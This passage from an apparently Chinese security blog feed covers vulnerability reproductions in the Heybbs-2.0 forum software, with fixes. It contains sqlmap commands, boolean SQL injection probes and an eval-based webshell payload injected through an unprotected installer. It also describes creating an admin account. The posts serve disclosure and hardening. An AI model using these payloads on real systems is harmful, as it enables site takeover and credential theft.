<span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>inputEmail3<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>col-sm-3 control-label<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>用户名<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>col-sm-9<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>form-control<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>inputEmail3<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Username<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>form-group<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>inputPassword3<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>col-sm-3 control-label<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>密码<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>col-sm-9<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>form-control<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>inputPassword3<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Password<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>form-group<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>inputPassword3<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>col-sm-3 control-label<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>确认密码<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>col-sm-9<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>form-control<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>inputPassword3<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Password<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>form-group<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>col-sm-offset-5 col-sm-5<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>btn btn-primary<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>注册<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>nav</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>navbar navbar-default navbar-fixed-bottom<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>   版权所有@<span class="token number">1</span>匹黑马  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>nav</span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>col-md-4<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> PHP开发基础篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> 编程 </tag>
            
            <tag> 安全开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Heybbs-2.0前台SQL注入漏洞复现</title>
      <link href="/posts/6f086fab.html"/>
      <url>/posts/6f086fab.html</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这个漏洞的成因主要是因为程序对用户的输入没有进行过滤而导致的</p><p>这个bbs也是我挖的前一天才更新的，还说已经解决了SQL注入的问题，我看了下源码，属实解决了个寂寞啊…<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210124161101911.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>手动测试了一下，And 1=1 返回正常<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210124161206817.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>And 1=2 返回404页面<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2021012416122012.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>先来看一下msg.php的代码吧<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210124161234604.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看到，GET过来的id直接赋值给了$id，下面的sql语句也是直接拼接进去的，连个单引号都没加</p><p>再来看一下user.php<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210124161317399.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>嗯，的确是一个人写的代码，一样的没有加过滤之类的代码级防护</p><h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><pre class="line-numbers language-php"><code class="language-php">Sqlmap <span class="token operator">-</span>u "http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//1.1.1.137:8002/msg.php?id=1"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210124161404954.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210124161409514.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>跑一下库</p><pre class="line-numbers language-php"><code class="language-php">Sqlmap <span class="token operator">-</span>u "http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//1.1.1.137:8002/msg.php?id=1" --dbs</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210124161432798.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>网站后台也是默认的admin.php，拿到账号密码后直接登录后台即可进行下一步操作</p><h3 id="临时修复"><a href="#临时修复" class="headerlink" title="临时修复"></a>临时修复</h3><p>临时修复我采用的是正则匹配，还有一些SQL语句中存在变量的，我都加了单引号，对msg.php文件就行一个代码级防护（先加固这一个，做一个样子出来吧）</p><p>部分代码：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string">'php/head.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$my</span><span class="token punctuation">[</span><span class="token string">'isadmin'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">"2"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">echo</span> <span class="token string">"&lt;script>alert('对不起，您的账号存在异常！',top.location='index.php')&lt;/script>"</span><span class="token punctuation">;</span>    exit<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token shell-comment comment">########################################################</span><span class="token shell-comment comment"># 简单的加固了一下                                      #</span><span class="token shell-comment comment"># 采用的是正则匹配进行一个过滤                           #</span><span class="token shell-comment comment"># By：1匹黑马                                          #</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                         <span class="token shell-comment comment">#</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/\d+/i"</span><span class="token punctuation">,</span><span class="token variable">$id</span><span class="token punctuation">,</span><span class="token variable">$new_id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                      <span class="token shell-comment comment">#</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$new_id</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                                      <span class="token shell-comment comment">#</span><span class="token shell-comment comment">########################################################</span><span class="token shell-comment comment"># 拼接到SQl语句中的变量也都加了单引号保护</span><span class="token variable">$msg</span><span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span><span class="token string">"select * from msg where id='$id'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_assoc</span><span class="token punctuation">(</span><span class="token variable">$msg</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$uid</span> <span class="token operator">=</span> <span class="token variable">$msg</span><span class="token punctuation">[</span><span class="token string">'uid'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$mys</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span><span class="token string">"select * from user where id = '$uid'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$mys</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_assoc</span><span class="token punctuation">(</span><span class="token variable">$mys</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$nodeid</span><span class="token operator">=</span><span class="token variable">$msg</span><span class="token punctuation">[</span><span class="token string">'node'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$node</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span><span class="token string">"select * from node where id = '$nodeid'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$node</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_assoc</span><span class="token punctuation">(</span><span class="token variable">$node</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>加固后的注入效果：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210124161822361.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>看来还不错~<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210124161842668.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 代码审计篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> PHP </tag>
            
            <tag> 0day </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> 漏洞复现 </tag>
            
            <tag> Exp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Heybbs-2.0多处逻辑漏洞复现</title>
      <link href="/posts/fa941309.html"/>
      <url>/posts/fa941309.html</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><blockquote><p>这个漏洞的利用难度有些大，结合SQL注入漏洞，跑出数据库的用户跟密码后，需要有一个可以执行SQL语句的环境，我这里模拟受害者的网站开启了MySQL的远程登陆进行攻击。</p></blockquote><h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>测试这个漏洞之前我其实依然是想挖一下代码执行的，这个洞利用有一定难度，但确确实实存在，就算是创建不了数据库，也是可以创建一个管理员权限的账号。漏洞发生在/install/install.php中，代码没有加任何的判断，攻击者可以轻松访问这个安装页面，就算是demo站，也是可以的，要不是挂了WAF，这个站很快也会沦陷。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210120200413787.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>这是它的代码，上来就接收参数，也不做一个判断<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210120200435593.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>注意第23行，连接上数据库后会把数据库的配置信息写入/php/conn.php中</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210120200449942.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然而这个conn.php的配置文件，会在index.php中被包含进去<br>index.php</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210120200502575.png" alt="在这里插入图片描述"></p><p>head.php<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210120200515986.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>利用起来麻烦的原因就是数据库必须我们手动创建，他并不会判断有没有然后给我们创建，所以在前言中说需要一个可以执行SQL语句的环境</p><h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>首先通过前面的注入跑出数据库用户的账号密码……</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210120200748764.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>这里可以远程登陆，我们用Navicat连进去，得到一个SQL环境</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210120200802230.png" alt="在这里插入图片描述"></p><p>创建一个数据库，这里的数据库名字就讲究了，因为要写入到conn.php中，所以要去闭合语句。</p><p><strong>exp：xx”);eval($_REQUEST[‘a’]);#</strong><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210120200832376.png" alt="在这里插入图片描述"><br>返回到install页面中，在数据库名称一栏中填写exp，数据库账号密码根据跑出来的填写，管理随便填即可</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210120200848778.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>安装成功，语句也成功写入到conn.php中了<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210120200916275.png" alt="在这里插入图片描述"></p><p>访问index.php，连接成功！<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210120200927308.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>还有一个洞，危害相对于这个肯定是小了许多，不过俗话说的好，千里之堤，溃于蚁穴。当我们通过注入拿到数据库账号密码后，如果没有SQL执行环境创建数据库，那么我们依然可以创建一个admin权限的用户，同样是在安装页面。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210120200940420.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>点击立即安装后，会创建admin权限的用户test<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210120200958807.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>来到数据库看一下权限，1代表admin权限：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210120201011657.png" alt="在这里插入图片描述"></p><h3 id="临时修复"><a href="#临时修复" class="headerlink" title="临时修复"></a>临时修复</h3><p>临时修复我采用的是安装完毕后在当前文件夹下创建install.lock文件，访问install先进行一个判断，如果有这个文件就跳转并exit，如果没有就进行安装。<br>index.html改为php文件</p><p>index.php关键代码：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token string">'./install.lock'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                                                                                          <span class="token keyword">echo</span> <span class="token string">'&lt;script type="text/javascript">alert("系统已安装，如需要重新安装，请手工删除install目录下的install.lock文件！");&lt;/script>'</span><span class="token punctuation">;</span>       <span class="token keyword">echo</span> <span class="token string">'&lt;meta http-equiv="refresh" content="0;url=/">'</span><span class="token punctuation">;</span>                                                                         <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                                                                                                  <span class="token punctuation">}</span>   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>install.php</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$in</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">'./install.lock'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span> <span class="token punctuation">(</span><span class="token variable">$in</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>来看一下加固效果，安装完成后成功生成install.lock文件</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210120201423154.png" alt="在这里插入图片描述"></p><p>直接访问install弹窗并跳转到index.php</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" 